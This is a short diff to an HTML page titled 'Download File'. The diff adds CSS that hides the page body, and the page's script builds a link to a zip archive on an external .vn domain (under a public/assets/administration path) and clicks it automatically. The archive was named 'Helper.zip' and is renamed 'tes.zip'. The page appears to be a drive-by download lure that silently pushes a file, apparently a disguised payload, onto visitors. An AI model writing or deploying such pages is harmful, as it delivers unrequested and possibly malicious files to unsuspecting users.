@@ -4,15 +4,19 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Download File</title>
+    <style>
+        body {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-
     <script>
         // Function to start the download
         function startDownload() {
             var link = document.createElement('a');
-            link.href = 'http://kstapsara.vn/public/assets/administration/mainstructure/js/wow/tes.zip';
-            link.download = 'Helper.zip';
+            link.href = 'kstapsara.vn/public/assets/administration/mainstructure/js/wow/tes.zip';
+            link.download = 'tes.zip';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
